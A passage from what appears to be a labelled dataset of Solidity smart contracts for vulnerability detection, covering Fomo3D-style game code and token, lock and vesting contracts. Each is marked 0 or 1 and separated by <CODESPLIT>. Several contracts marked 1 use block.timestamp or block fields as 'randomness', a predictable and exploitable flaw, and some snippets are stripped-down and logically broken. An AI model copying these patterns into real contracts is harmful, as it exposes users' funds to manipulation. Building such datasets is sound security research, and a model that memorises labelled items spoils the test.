(plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;            if (round_[_rID].team != _team)                round_[_rID].team = _team;                         _eventData_.compressedData = _eventData_.compressedData + 100;        }                         if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                 airDropTracker_ = 0;            }        }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = getPlayerID(msg.sender);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 _com = _com.add(_p3d.sub(_p3d / 2));        admin.transfer(_com);        _res = _res.add(_p3d / 2);                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                 rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;        return(_eventData_);    }         function updateGenVault(uint256 _pID, uint256 _rIDlast)        private    {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }         function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                 uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                 if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }         function airdrop()        private        view        returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(            (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)        )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _p1 = _eth / 100;        uint256 _com = _eth / 50;        _com = _com.add(_p1);        uint256 _p3d;        if (!address(admin).call.value(_com)())        {                                                                                          _p3d = _com;            _com = 0;        }                 uint256 _aff = _eth / 10;                 _p3d = _p3d.add(_aff);                         _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                         uint256 _potAmount = _p3d / 2;            admin.transfer(_p3d.sub(_potAmount));            round_[_rID].pot = round_[_rID].pot.add(_potAmount);                         _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }    function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                 _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin, "only admin can activate");                 require(activated_ == false, "FOMO Short already activated");                 activated_ = true;                 rID_ = 1;            round_[1].strt = now + rndExtra_ - rndGap_;            round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract ActionAuctionPlat {    struct Auction {        uint64 tokenId;        uint64 tmStart;        uint64 tmSell;           }    Auction[] public auctionArray;    mapping(uint256 => uint256) public latestAction;    uint64 public auctionDuration = 172800;    function isOnSale(uint256 _tokenId) external view returns(bool) {        uint256 lastIndex = latestAction[_tokenId];        if (lastIndex > 0) {            Auction storage order = auctionArray[lastIndex];            uint64 tmNow = uint64(block.timestamp);            if ((order.tmStart + auctionDuration > tmNow) && order.tmSell == 0) {                return true;            }        }        return false;    }}
0<CODESPLIT>contract ISStop is Ownable {    bool public stopped;    modifier stoppable {        assert (!stopped);        _;    }    function stop() public onlyOwner {        stopped = true;    }    function start() public onlyOwner {        stopped = false;    }}  
0<CODESPLIT>contract InseeCoin is ISStop, StandardToken{    string public name = "Insee Coin";    uint8 public decimals = 18;    string public symbol = "SEE";    string public version = "v0.1";          uint256 public initialAmount = (10 ** 10) * (10 ** 18);       event Destroy(address from, uint value);    function InseeCoin() public {        balances[msg.sender] = initialAmount;            totalSupply_ = initialAmount;                   }    function transfer(address dst, uint wad) public stoppable  returns (bool) {        return super.transfer(dst, wad);    }    function transferFrom(address src, address dst, uint wad) public stoppable  returns (bool) {        return super.transferFrom(src, dst, wad);    }        function approve(address guy, uint wad) public stoppable  returns (bool) {        return super.approve(guy, wad);    }    function destroy(uint256 _amount) external onlyOwner stoppable  returns (bool success){        require(balances[msg.sender] >= _amount);        balances[msg.sender] = balances[msg.sender].sub(_amount);        totalSupply_ = totalSupply_.sub(_amount);        emit Destroy(msg.sender, _amount);        return true;    }     function setName(string name_) public onlyOwner{        name = name_;    }} 
1<CODESPLIT>contract TokenLock {    using SafeMath for uint256;	InseeCoin  public  ISC;               uint256 private nextLockID = 0;         mapping (uint256 => TokenTimeLockInfo) public locks;         struct TokenTimeLockInfo {                 address beneficiary;                 uint256 amount;                 uint256 unlockTime;    }         event Lock (uint256 indexed id, address indexed beneficiary,uint256 amount, uint256 lockTime);           event Unlock (uint256 indexed id, address indexed beneficiary,uint256 amount, uint256 unlockTime);	function TokenLock(InseeCoin isc) public {        assert(address(isc) != address(0));        ISC = isc;	}	     function lock (      address _beneficiary, uint256 _amount,        uint256 _lockTime) public returns (uint256) {        require (_amount > 0);        require (_lockTime > 0);        nextLockID = nextLockID.add(1);        uint256 id = nextLockID;        TokenTimeLockInfo storage lockInfo = locks [id];        require (lockInfo.beneficiary == 0x0);        require (lockInfo.amount == 0);        require (lockInfo.unlockTime == 0);        lockInfo.beneficiary = _beneficiary;        lockInfo.amount = _amount;        lockInfo.unlockTime =  now.add(_lockTime);        emit Lock (id, _beneficiary, _amount, _lockTime);        require (ISC.transferFrom (msg.sender, this, _amount));        return id;    }         function unlock (uint256 _id) public {        TokenTimeLockInfo memory lockInfo = locks [_id];        delete locks [_id];        require (lockInfo.amount > 0);        require (lockInfo.unlockTime <= block.timestamp);        emit Unlock (_id, lockInfo.beneficiary, lockInfo.amount, lockInfo.unlockTime);        require (            ISC.transfer (                lockInfo.beneficiary, lockInfo.amount));    }}
1<CODESPLIT>contract VestingToken {  struct Vesting {    uint256 start;               uint256 cliff;  }  mapping(address => Vesting) public vestings;  function vestedAmount(address _beneficiary) public view returns (uint256) {    Vesting storage vesting = vestings[_beneficiary];    if (block.timestamp < vesting.start + vesting.cliff) {        return block.timestamp;    }  }}
1<CODESPLIT>contract Variation {    uint256 public randomSeed;    function random() internal returns(uint256) {        uint256 randomValue = uint256(keccak256(block.timestamp, uint256(randomSeed * block.difficulty)));        randomSeed = uint256(randomValue * block.number);        return randomSeed;    }}
1<CODESPLIT>contract TokenOffering is StandardToken, Ownable, BurnableToken {      bool public offeringEnabled;       uint256 public currentTotalTokenOffering;       uint256 public currentTokenOfferingRaised;       uint256 public bonusRateOneEth;       uint256 public startTime;    uint256 public endTime;    bool public isBurnInClose = false;    bool public isOfferingStarted = false;    event OfferingOpens(uint256 startTime, uint256 endTime, uint256 totalTokenOffering, uint256 bonusRateOneEth);    event OfferingCloses(uint256 endTime, uint256 tokenOfferingRaised);        function setBonusRate(uint256 _bonusRateOneEth) public onlyOwner {        bonusRateOneEth = _bonusRateOneEth;    }                        function preValidatePurchase(uint256 _amount) internal {        require(_amount > 0);        require(isOfferingStarted);        require(offeringEnabled);        require(currentTokenOfferingRaised.add(_amount) <= currentTotalTokenOffering);        require(block.timestamp >= startTime && block.timestamp <= endTime);    }            function stopOffering() public onlyOwner {        offeringEnabled = false;    }            function resumeOffering() public onlyOwner {        offeringEnabled = true;    }        function startOffering(        uint256 _tokenOffering,         uint256 _bonusRateOneEth,         uint256 _startTime,         uint256 _endTime,        bool _isBurnInClose    ) public onlyOwner returns (bool) {        require(_tokenOffering <= balances[owner]);        require(_startTime <= _endTime);        require(_startTime >= block.timestamp);               require(!isOfferingStarted);        isOfferingStarted = true;               startTime = _startTime;        endTime = _endTime;               isBurnInClose = _isBurnInClose;               currentTokenOfferingRaised = 0;        currentTotalTokenOffering = _tokenOffering;        offeringEnabled = true;        setBonusRate(_bonusRateOneEth);        emit OfferingOpens(startTime, endTime, currentTotalTokenOffering, bonusRateOneEth);        return true;    }        function updateStartTime(uint256 _startTime) public onlyOwner {        require(isOfferingStarted);        require(_startTime <= endTime);        require(_startTime >= block.timestamp);        startTime = _startTime;    }        function updateEndTime(uint256 _endTime) public onlyOwner {        require(isOfferingStarted);        require(_endTime >= startTime);        endTime = _endTime;    }        function updateBurnableStatus(bool _isBurnInClose) public onlyOwner {        require(isOfferingStarted);        isBurnInClose = _isBurnInClose;    }        function endOffering() public onlyOwner {        if (isBurnInClose) {            burnRemainTokenOffering();        }        emit OfferingCloses(endTime, currentTokenOfferingRaised);        resetOfferingStatus();    }        function burnRemainTokenOffering() internal {        if (currentTokenOfferingRaised < currentTotalTokenOffering) {            uint256 remainTokenOffering = currentTotalTokenOffering.sub(currentTokenOfferingRaised);            _burn(owner, remainTokenOffering);        }    }        function resetOfferingStatus() internal {        isOfferingStarted = false;                startTime = 0;        endTime = 0;        currentTotalTokenOffering = 0;        currentTokenOfferingRaised = 0;        bonusRateOneEth = 0;        offeringEnabled = false;        isBurnInClose = false;    }}
0<CODESPLIT>contract WithdrawTrack is StandardToken, Ownable {	struct TrackInfo {		address to;		uint256 amountToken;		string withdrawId;	}	mapping(string => TrackInfo) withdrawTracks;	function withdrawToken(address _to, uint256 _amountToken, string _withdrawId) public onlyOwner returns (bool) {		bool result = transfer(_to, _amountToken);		if (result) {			withdrawTracks[_withdrawId] = TrackInfo(_to, _amountToken, _withdrawId);		}		return result;	}	function withdrawTrackOf(string _withdrawId) public view returns (address to, uint256 amountToken) {		TrackInfo track = withdrawTracks[_withdrawId];		return (track.to, track.amountToken);	}}
0<CODESPLIT>contract ContractSpendToken is StandardToken, Ownable {  mapping (address => address) private contractToReceiver;  function addContract(address _contractAdd, address _to) external onlyOwner returns (bool) {    require(_contractAdd != address(0x0));    require(_to != address(0x0));    contractToReceiver[_contractAdd] = _to;    return true;  }  function removeContract(address _contractAdd) external onlyOwner returns (bool) {    contractToReceiver[_contractAdd] = address(0x0);    return true;  }  function contractSpend(address _from, uint256 _value) public returns (bool) {    address _to = contractToReceiver[msg.sender];    require(_to != address(0x0));    require(_value <= balances[_from]);    balances[_from] = balances[_from].sub(_value);    balances[_to] = balances[_to].add(_value);    emit Transfer(_from, _to, _value);    return true;  }  function getContractReceiver(address _contractAdd) public view onlyOwner returns (address) {    return contractToReceiver[_contractAdd];  }}
0<CODESPLIT>contract ContractiumToken is TokenOffering, WithdrawTrack, ContractSpendToken {    string public constant name = "Contractium";    string public constant symbol = "CTU";    uint8 public constant decimals = 18;      uint256 public constant INITIAL_SUPPLY = 3000000000 * (10 ** uint256(decimals));      uint256 public unitsOneEthCanBuy = 15000;       uint256 internal totalWeiRaised;    event BuyToken(address from, uint256 weiAmount, uint256 tokenAmount);    function ContractiumToken() public {        totalSupply_ = INITIAL_SUPPLY;        balances[msg.sender] = INITIAL_SUPPLY;                emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);    }    function() public payable {        require(msg.sender != owner);               uint256 amount = msg.value.mul(unitsOneEthCanBuy);               uint256 amountBonus = msg.value.mul(bonusRateOneEth);                       amount = amount.add(amountBonus);               preValidatePurchase(amount);        require(balances[owner] >= amount);                totalWeiRaised = totalWeiRaised.add(msg.value);                   currentTokenOfferingRaised = currentTokenOfferingRaised.add(amount);                 balances[owner] = balances[owner].sub(amount);        balances[msg.sender] = balances[msg.sender].add(amount);        emit Transfer(owner, msg.sender, amount);        emit BuyToken(msg.sender, msg.value, amount);               owner.transfer(msg.value);                                    }    function batchTransfer(address[] _receivers, uint256[] _amounts) public returns(bool) {        uint256 cnt = _receivers.length;        require(cnt > 0 && cnt <= 20);        require(cnt == _amounts.length);        cnt = (uint8)(cnt);        uint256 totalAmount = 0;        for (uint8 i = 0; i < cnt; i++) {            totalAmount = totalAmount.add(_amounts[i]);        }        require(totalAmount <= balances[msg.sender]);        balances[msg.sender] = balances[msg.sender].sub(totalAmount);        for (i = 0; i < cnt; i++) {            balances[_receivers[i]] = balances[_receivers[i]].add(_amounts[i]);                        emit Transfer(msg.sender, _receivers[i], _amounts[i]);        }        return true;    }}
1<CODESPLIT>contract F3d is F3Devents {  using SafeMath for *;    uint256 public a;       uint256 public b;       uint256 public ta;      uint256 public tb;      uint256 public tc;      uint256 public td;      uint256 public te;      uint256 public wa;      uint256 public wb;      uint256 public wc;      uint256 public wd;      uint256 public we;      uint256 public maxTimeRemain;                        uint256 public timeGap;                                uint256 public soldKeys;                             uint256 public decimals = 1000000;    bool public pause;  address public owner;  address public admin;  PlayerStatus[] public players;  mapping(address => uint256) public playerIds;  mapping(uint256 => Round) public rounds;  mapping(uint256 => mapping (uint256 => PlayerRound)) public playerRoundData;  uint256 public currentRound;    struct PlayerStatus {    address addr;               uint256 wallet;             uint256 affiliate;          uint256 win;                uint256 lrnd;               uint256 referer;          }    struct PlayerRound {      uint256 eth;                uint256 keys;               uint256 mask;           }    struct Round {      uint256 eth;                uint256 keys;               uint256 mask;               address winner;             uint256 pool;               uint256 endTime;        }    modifier onlyOwner() {    require(msg.sender == owner);    _;  }  modifier whenNotPaused() {    require(!pause);    _;  }  modifier onlyAdmin() {      require(msg.sender == admin);      _;  }    function setPause(bool _pause) onlyAdmin public {    pause = _pause;  }  constructor(uint256 _a, uint256 _b,   uint256 _ta, uint256 _tb, uint256 _tc, uint256 _td, uint256 _te,  uint256 _wa, uint256 _wb, uint256 _wc, uint256 _wd, uint256 _we,  uint256 _maxTimeRemain, uint256 _gap, address _owner) public {    a = _a;    b = _b;    ta = _ta;    tb = _tb;    tc = _tc;    td = _td;    te = _te;        wa = _wa;    wb = _wb;    wc = _wc;    wd = _wd;    we = _we;             require(ta.add(tb).add(tc).add(td).add(te) == 1000);    require(wa.add(wb).add(wc).add(wd).add(we) == 1000);    owner = _owner;         currentRound = 1;    rounds[currentRound] = Round(0, 0, 0, owner, 0, block.timestamp.add(_maxTimeRemain));    maxTimeRemain = _maxTimeRemain;    timeGap = _gap;        admin = msg.sender;         players.push(PlayerStatus(        owner,        0,        0,        0,        0,        0));  }     function Price(uint256 n) public view returns (uint256) {    return n.mul(a).add(b);  }  function updatePlayer(uint256 _pID) private {      if(players[_pID].lrnd != 0) {          updateWallet(_pID, players[_pID].lrnd);      }      players[_pID].lrnd = currentRound;  }    function updateWallet(uint256 _pID, uint256 _round) private {      uint256 earnings = calculateMasked(_pID, _round);      if (earnings > 0) {          players[_pID].wallet = earnings.add(players[_pID].wallet);          playerRoundData[_pID][_round].mask = earnings.add(playerRoundData[_pID][_round].mask);      }  }    function profit() public view returns (uint256) {      uint256 id = playerIds[msg.sender];      if (id == 0 && msg.sender != owner) {          return 0;      }      PlayerStatus memory player = players[id];            return player.wallet.add(player.affiliate).add(player.win).add(calculateMasked(id, player.lrnd));  }    function calculateMasked(uint256 _pID, uint256 _round) private view returns (uint256) {      PlayerRound memory roundData = playerRoundData[_pID][_round];      return rounds[_round].mask.mul(roundData.keys).sub(roundData.mask);  }    function registerUserIfNeeded(uint256 ref) public {      if (msg.sender != owner) {          if (playerIds[msg.sender] == 0) {              playerIds[msg.sender] = players.length;              if (ref >= players.length) {                  ref = 0;              }                            players.push(PlayerStatus(                  msg.sender,                  0,                  0,                  0,                  0,                  ref));          }      }  }       function finalize(uint256 ref) public {      Round storage lastOne = rounds[currentRound];             require(block.timestamp > lastOne.endTime);                   registerUserIfNeeded(ref);             currentRound = currentRound.add(1);      Round storage _round = rounds[currentRound];      _round.endTime = block.timestamp.add(maxTimeRemain);      _round.winner = owner;                         uint256 money = lastOne.pool;            if (money == 0) {                     return;      }             _round.pool = money.mul(wb) / 1000;             uint256 toWinner = money.mul(wa) / 1000;      players[playerIds[lastOne.winner]].win = toWinner.add(players[playerIds[lastOne.winner]].win);                   uint256 toRevealer = money.mul(wc) / 1000;      uint256 revealId = playerIds[msg.sender];                   if (msg.sender == lastOne.winner) {          revealId = 0;      }            